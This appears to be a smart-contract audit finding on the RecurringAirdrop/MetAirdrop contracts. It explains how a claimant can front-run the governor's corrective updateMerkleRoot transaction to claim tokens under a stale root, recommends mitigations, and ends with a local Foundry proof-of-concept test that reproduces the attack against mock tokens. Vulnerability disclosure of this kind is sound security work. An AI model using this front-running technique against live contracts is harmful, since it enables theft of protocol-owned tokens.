### Title
Attacker can front-run `updateMerkleRoot` to claim under a stale/incorrect root before the governor corrects it - (File: contracts/utils/RecurringAirdrop.sol)

### Summary
`RecurringAirdrop` (and its production child `MetAirdrop`) distributes tokens via a single global `merkleRoot` that the governor replaces atomically through `updateMerkleRoot`. `claim` is a public, unauthenticated-except-proof function that executes instantly against whatever root is currently stored. A malicious claimant who observes a pending `updateMerkleRoot` transaction in the mempool can front-run it with `claim` and extract tokens under the old root that the governor is actively trying to revoke or correct — the same class as front-running `revokeUnvested`/`revokeAll` in the reference report.

### Finding Description
The governor's only mechanism for invalidating a distribution is `RecurringAirdrop.updateMerkleRoot`, which overwrites `merkleRoot` in a single transaction (`contracts/utils/RecurringAirdrop.sol:81-90`). `claim` verifies the leaf `keccak256(abi.encodePacked(msg.sender, amount_))` against the current `merkleRoot` and immediately transfers `amount_ - claimed[msg.sender]` (`contracts/utils/RecurringAirdrop.sol:52-66`). There is no delay, grace period, pending-root commit phase, or per-epoch disable between the moment the governor broadcasts the root update and the moment it executes.

This matters whenever a root update is a *revocation/correction* rather than an additive new epoch: e.g. the published root mistakenly over-allocates to an attacker-controlled address, includes sybil accounts the governor wants removed, or was computed incorrectly and must be replaced. The attacker (who already holds a valid proof under the old root — proofs are published via `proofsFileHash`) sees `updateMerkleRoot` in the mempool and submits `claim(amount_, proof_)` with higher gas. The claim lands first, transfers the tokens (in `MetAirdrop`, `MET` or `esMET`-locked `MET` via `MetAirdrop._transferReward`, `contracts/MetAirdrop.sol:31-48`), and increments `claimed[attacker]`. When the correction root lands, it is too late: since `claimed` is cumulative and never reset, the new root cannot claw back the withdrawn tokens, and `amount_ - claimed` accounting even makes retroactive reduction impossible without reverting.

Nothing blocks this path: `claim` has no pause flag, `nonReentrant` is per-call only, and `msg.sender` is used directly so any EOA or contract holding a valid leaf can execute it.

### Impact Explanation
Direct theft of protocol-owned reward tokens. Any allocation the governor intends to invalidate via a root update can be extracted by the affected claimant before the update executes, making the revocation ineffective. For `MetAirdrop` this is real `MET` value leaving the contract.

### Likelihood Explanation
Requires a pending governor `updateMerkleRoot` transaction and a claimant with a valid proof under the old root — a routine situation during any corrective root rotation or sybil cleanup. Mempool monitoring is standard; the attack costs one frontrun transaction. No privileged roles, oracle manipulation, or flash loans needed.

### Recommendation
Apply the same mitigations as the referenced report:
1. Two-phase root update: `proposeMerkleRoot` stores a pending root and a timelock; it only becomes active after a delay, and optionally claims against the old root are frozen once a pending root exists (or claims are only honored under the pending root after it activates, giving the governor a window to cancel).
2. Alternatively/additionally, submit `updateMerkleRoot` through a private mempool (e.g. Flashbots Protect, MEV-Blocker) so the revocation cannot be observed before execution.
3. Add a governor-controlled pause on `claim` so claims can be halted before a corrective update.

### Proof of Concept
Foundry-style reproduction (contract-local, no fork required unless testing `MetAirdrop`'s `esMET` path on mainnet):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {RecurringAirdrop} from "../contracts/utils/RecurringAirdrop.sol";
import {IERC20} from "../contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt; balanceOf[to] += amt; return true;
    }
}

contract FrontRunMerkleRootTest is Test {
    RecurringAirdrop airdrop;
    MockERC20 token;
    address governor = address(0x60a1);
    address attacker = address(0xA77AC);

    function setUp() public {
        token = new MockERC20();
        airdrop = new RecurringAirdrop(IERC20(address(token)));
        airdrop.transferGovernorship(governor);
        vm.prank(governor);
        airdrop.acceptGovernorship();
        token.mint(address(airdrop), 1_000e18);
    }

    function test_frontRunRootCorrection() public {
        // Old (bad) root gives attacker 500e18. Leaf = keccak256(abi.encodePacked(attacker, 500e18))
        // For a single-leaf tree, root == leaf.
        bytes32 badLeaf = keccak256(abi.encodePacked(attacker, uint256(500e18)));
        vm.prank(governor);
        airdrop.updateMerkleRoot(badLeaf, bytes32("proofs-v1"));

        // Governor notices the bad allocation and broadcasts a corrected root.
        // Attacker sees it in the mempool and front-runs with claim() (empty proof for single leaf).
        bytes32[] memory proof = new bytes32[](0);
        vm.prank(attacker);
        airdrop.claim(500e18, proof);

        // Correction lands too late.
        bytes32 goodLeaf = keccak256(abi.encodePacked(attacker, uint256(0)));
        vm.prank(governor);
        airdrop.updateMerkleRoot(goodLeaf, bytes32("proofs-v2"));

        assertEq(token.balanceOf(attacker), 500e18); // revoked allocation already stolen
    }
}
```

The test shows the full sequence — bad root active, corrective `updateMerkleRoot` pending, attacker front-runs `claim`, correction executes — and confirms tokens are irreversibly extracted despite the revocation.